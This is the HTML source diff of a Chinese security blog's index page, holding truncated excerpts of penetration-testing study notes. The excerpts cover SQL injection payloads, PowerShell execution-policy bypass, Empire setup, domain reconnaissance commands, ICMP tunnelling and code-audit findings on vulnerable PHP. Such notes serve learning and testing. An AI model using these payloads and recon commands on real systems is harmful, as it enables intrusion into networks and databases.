+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Time'Blog</title><meta name="author" content="Time"><meta name="copyright" content="Time"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="Time&#39;Blog">
+<meta property="og:url" content="https://timeshu.github.io/page/4/index.html">
+<meta property="og:site_name" content="Time&#39;Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://timeshu.github.io/img/avatar.jpg">
+<meta property="article:author" content="Time">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://timeshu.github.io/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timeshu.github.io/page/4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
     }
-    viewer_init()
-</script>
-
-<!-- MathJax -->
-
-<!-- Katex -->
-
-<!-- busuanzi  -->
-
-
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-
-<!-- ClickLove -->
-
-
-<script src="/js/clickLove.js"></script>
-
-
-<!-- ClickBoom -->
-
-
-<script src="/js/clickBoom.js"></script>
-
-
-<!-- CodeCopy -->
-
-
-<link rel="stylesheet" href="/css/clipboard.css">
-
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
-<script>
-  function wait(callback, seconds) {
-    var timelag = null;
-    timelag = window.setTimeout(callback, seconds);
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Time\'Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-01-01 07:21:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
   }
-  !function (e, t, a) {
-    var initCopyCode = function(){
-      var copyHtml = '';
-      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
-      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
-      copyHtml += '</button>';
-      $(".highlight .code pre").before(copyHtml);
-      $(".article pre code").before(copyHtml);
-      var clipboard = new ClipboardJS('.btn-copy', {
-        target: function(trigger) {
-          return trigger.nextElementSibling;
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
         }
-      });
-      clipboard.on('success', function(e) {
-        let $btn = $(e.trigger);
-        $btn.addClass('copied');
-        let $icon = $($btn.find('i'));
-        $icon.removeClass('ri-file-copy-2-line');
-        $icon.addClass('ri-checkbox-circle-line');
-        let $span = $($btn.find('span'));
-        $span[0].innerText = 'COPIED';
-        
-        wait(function () { // 等待两秒钟后恢复
-          $icon.removeClass('ri-checkbox-circle-line');
-          $icon.addClass('ri-file-copy-2-line');
-          $span[0].innerText = 'COPY';
-        }, 2000);
-      });
-      clipboard.on('error', function(e) {
-        e.clearSelection();
-        let $btn = $(e.trigger);
-        $btn.addClass('copy-failed');
-        let $icon = $($btn.find('i'));
-        $icon.removeClass('ri-file-copy-2-line');
-        $icon.addClass('ri-time-line');
-        let $span = $($btn.find('span'));
-        $span[0].innerText = 'COPY FAILED';
-        
-        wait(function () { // 等待两秒钟后恢复
-          $icon.removeClass('ri-time-line');
-          $icon.addClass('ri-file-copy-2-line');
-          $span[0].innerText = 'COPY';
-        }, 2000);
-      });
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
     }
-    initCopyCode();
-  }(window, document);
-</script>
-
-
-
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-    <div id="music">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    
-    
-    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
-        src="//music.163.com/outchain/player?type=2&id=27896818&auto=1&height=32"></iframe>
-</div>
-
-<style>
-    #music {
-        position: fixed;
-        right: 15px;
-        bottom: 0;
-        z-index: 998;
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
     }
-</style>
     
-  </div>
-</body>
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://wallroom.io/img/3840x2160/bg-3579ca5.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Time'Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Time'Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/06/05/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/" title="微信小程序反编译获取源码">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序反编译获取源码"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/05/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/" title="微信小程序反编译获取源码">微信小程序反编译获取源码</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-05T09:33:19.000Z" title="发表于 2020-06-05 17:33:19">2020-06-05</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E7%A8%8B%E5%BA%8F/">小程序</a></span></div><div class="content">
 
-</html>
+
+0x00 环境搭建1、Nodejs
+​        下载连接: https://nodejs.org/zh-cn/download/ 
+​        安装成功后，在系统中配置环境变量即可，运行node -v，如下图说明安装成功
+​    
+2、反编译脚本，github搜索wxappUnpacker或其他版本(由于敏感此处不放连接，自行下载)
+3、模拟器(手机)，夜神、雷神、逍遥等都可以。
+0x01 前期准备1、下载RE文件管理器，允许使用超级管理员权限
+2、手机已ROOT或使用模拟器ROOT模式
+3、下载微信
+0x02 获取小程序包当点开一个微信小程序，如果本地这个文件夹下找到即将运行的小程序，会从微信服务器下载到本地，在以后的某个时刻又运行这个小程序，运行时，微信服务器会通知有没有小程序新版本，如有新版本，会在后台静默下载，小程序继续运行，新版本要到下一次运行才会启用，这就是微信小程序的更新机制。
+小程序包地址：/data/data/com.tencent.mm/MicroMsg/随机长字符串/appbrand/pkg/
+将pkg文件夹中的包清空，返回微信打开需要抓取的小 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E6%94%B6%E9%9B%86%E5%8F%8A%E5%AD%A6%E4%B9%A0/" title="数据库注入语句收集及学习">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库注入语句收集及学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E6%94%B6%E9%9B%86%E5%8F%8A%E5%AD%A6%E4%B9%A0/" title="数据库注入语句收集及学习">数据库注入语句收集及学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-02T16:59:09.000Z" title="发表于 2020-06-03 00:59:09">2020-06-03</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="content">
+
+
+0x00 任务介绍1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入）
+2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式）
+3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payload 的理解，其中会涉及之前学习的基础。
+扩展学习：理解 sqlmap 自带 tamper 的原理，这里通常包含很多数据库的特性，从而实现 payload 变形啥的，用来绕过一些简单的安全检测
+0x01 收集注入语句盲注1、布尔注入
+利用场景	通过页面是否返回正常判定是否存在注入原理	以真假判断是否存在，真为正常，假为不正常(页面区别不大，需仔细辨别不同点来判断是否存在注入)测试流程  存在注入点，判断第一个数据库第一个字符是否等于c  	and substr(database(),3,1)='c'  判断数据库的第一张表的第一个字符是否等于a  	and (ascii(substr((select table_name f ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/06/03/powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF/" title="powershell收集域信息">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="powershell收集域信息"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/03/powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E4%BF%A1%E6%81%AF/" title="powershell收集域信息">powershell收集域信息</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-02T16:56:44.000Z" title="发表于 2020-06-03 00:56:44">2020-06-03</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">
+
+
+0x00 PowerShellPowerShell版本信息：
+
+2.0    windows2008，windows7
+
+3.0    windows2012，windows8
+
+4.0    windows2012R2，windows8.1
+
+5.0    windows2016，windows10
+
+
+PowerShell权限
+
+Restricted
+
+默认的设置， 不允许任何script运行
+
+
+Allsigned         
+
+只能运行经过数字证书签名的script
+
+
+Unrestricted    
+
+运行本地的script不需要数字签名，但是运行从网络上下载的script就必须要有数字签名
+
+
+RemoteSigned
+
+允许所有的script运行
+
+
+
+PowerShell基本命令
+
+Get-ExecutionPolicy
+
+查看当前策略
+
+  
+
+Set-ExecutionPolicy 参数(例：Unrestricted)
+
+修改执行策略权限
+
+  
+
+-exec bypass
+
+绕过禁止执行脚本策略
+
+  
+
+Import-Module .\PowerV ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" title="Empire工具基础用法">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Empire工具基础用法"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/03/Empire%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" title="Empire工具基础用法">Empire工具基础用法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-02T16:54:14.000Z" title="发表于 2020-06-03 00:54:14">2020-06-03</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">
+
+
+0x00 介绍​        Empire 是一款类似Metasploit 的渗透测试框架，基于python 编写，Empire是一个纯粹的PowerShell 后开发代理，建立在密码安全通信和灵活的架构上。Empire 实现了无需powershell.exe 即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。
+0x01 安装下载地址： https://github.com/EmpireProject/Empire
+下载地址：https://github.com/interference-security/empire-web.git  (web版)
+下载git clone https://github.com/EmpireProject/Empire.git切换至工具目录setup下	./install.sh出现setip comlete则安装成功	./reset.sh
+
+
+切换至主目录运行./empire，如果出现错误则使用pip安装模块即可若出现无pyd ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/06/03/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="域内信息收集">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域内信息收集"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/03/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="域内信息收集">域内信息收集</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-02T16:43:36.000Z" title="发表于 2020-06-03 00:43:36">2020-06-03</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">
+
+
+0x01 本机信息收集查看当前工作组	net view查询网络配置	ifconfig /all本机用户列表	net user管理员用户列表	net localgroup administrators	查看当前在线用户	query user || qwinsta	查询进程	tasklist /v	wmic process list brief	查询端口列表	netstat -ano	查询系统补丁信息等	systeminfo	查询补丁列表	wmic qfe get caption,description,HotFixID,installed0n查询本机共享	net share	net share hostname(主机名)	wmic share get name,path,status	IPC$连接	net use \\ip\ipc$ "密码" /user:账号	net use Z: \\ip\c$ 映射网络主机C盘到本机	查询用户权限	whoami
+
+收集操作系统及安装软件版本信息获取操作系统和版本信息systeminfo | findstr /B /C:"OS 名称(name)" ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/06/01/mkcms%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="mkcms注入审计学习">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mkcms注入审计学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/06/01/mkcms%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="mkcms注入审计学习">mkcms注入审计学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-06-01T14:30:56.000Z" title="发表于 2020-06-01 22:30:56">2020-06-01</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">
+
+
+0x00 目标本次学习目标为找出mkcms的sql注入漏洞
+0x01 CMS目录说明核心目录admin	管理员目录data 	页面显示模板editor	kindeditor编辑器上传目录install	安装目录system	配置信息，数据库连接文件等ucenter	用户目录
+
+0x02 审计工具使用对于新手来说，当然是先各种审计工具一把梭，用法师的审计工具对mkcms自动审计一波，扫出了不少漏洞。
+
+0x03 后台管理员修改处SQL注入漏洞主题是挖sql注入，自然是先怼注入，第一个是后台管理员修改处
+//为了简洁，我删除了部分代码，留下漏洞代码,此漏洞存在admin/cms_admin_edit.php    $result = mysql_query('select * from mkcms_manager where m_id = '.$_GET['id'].'');	if($row = mysql_fetch_array($result)){//此处代码未做过滤，直接拼接(当时没有看安全函数，直接就刚了)
+
+代码是这样的
+
+直接抓包做测试，使用审计工具中的mysql数据库监 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/05/31/dvwa%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="dvwa审计学习">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="dvwa审计学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/31/dvwa%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" title="dvwa审计学习">dvwa审计学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-31T15:39:24.000Z" title="发表于 2020-05-31 23:39:24">2020-05-31</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">
+
+
+0x00 环境[TOC]
+php环境：5.4.45
+mysql环境：5.6.35
+dvwa版本：官网最新
+0x01 SQL注入漏洞Low级别漏洞代码if( isset( $_REQUEST[ 'Submit' ] ) ) {//判断request中的submit是否已设置	// Get input	$id = $_REQUEST[ 'id' ];//获取id的值	// Check database    //此处为拼接sql语句	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";    //执行成功后将结果赋给变量，执行出错则终止代码，并抛出错误	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/05/31/hello-world/" title="Hello World">     <img class="post_bg" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/31/hello-world/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-31T05:31:53.361Z" title="发表于 2020-05-31 13:31:53">2020-05-31</time></span></div><div class="content">
+
+Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post$ hexo new "My New Post"
+
+More info: Writing
+Run server$ hexo server
+
+Generate static files$ hexo generate
+
+More info: Generating
+Deploy to remote sites$ hexo deploy
+
+More info: Deployment
+</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/02/18/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="隐藏通信隧道技术">     <img class="post_bg" src="/img/img/46.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="隐藏通信隧道技术"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/02/18/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="隐藏通信隧道技术">隐藏通信隧道技术</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-02-18T12:03:23.000Z" title="发表于 2020-02-18 20:03:23">2020-02-18</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">
+
+
+0x00 内网连通性判定判断内网哪一层协议连通，使用对应隧道技术穿透。
+1、网络层隧道
+
+IPv6隧道
+ICMP隧道
+
+PS：判定连通工具，ping ip
+2、传输层隧道
+
+TCP
+UDP
+
+PS：判定连通工具，nc ip port
+3、应用层隧道
+
+SSH
+HTTP   
+
+PS：判定连通工具，Curl ip:port
+
+HTTPS
+DNS
+
+PS:判定连通工具
+​        nslookup 网址 [ip]
+​        dig [@ip] 网址
+
+0x01 网络层隧道ICMPSH工具安装
+下载链接：git clone https://github.com/inquisb/icmpsh.gitapt-get install python-impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1
+
+
+
+环境
+攻击机：kali	192.168.0.118防火墙：monowall	192.168.0.116(外网) 192.168.1.1(内网)受控机：windows7	192.168.1.4攻击机运行命令./icmp_m.py 1 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/" title="域管理员定位工具">     <img class="post_bg" src="/img/img/60.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域管理员定位工具"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/" title="域管理员定位工具">域管理员定位工具</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-02-08T07:13:04.000Z" title="发表于 2020-02-08 15:13:04">2020-02-08</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">
+
+
+0x00 Psloggedon1、psloggedon
+​        在 Windows 中，可以使用命令“net session”查看谁在本地计算机上使用了资源，但是没有命 令用来查看谁在使用远程计算机的资源、谁登录了本地或远程计算机。psloggedon.exe 可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户指定了用户名而不是计算机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录，其原理是通过检 验注册表里 HKEY_USERS 项的 key 值来查询谁登录过机器(同样调用了 NetSessionEnum API)， 某些功能需要拥有管理员权限才能使用。
+psloggedon [-] [-l] [-x] [\\computername|username]-:显示支持的选项和用于输出值的单位。-l:仅显示本地登录，不显示本地和网络资源登录。-x:不显示登录时间。\\computername:指定要列出登录信息的计算机的名称。Username:指定用户名，在网络中搜索该用户登录的计算机。
+
+
+
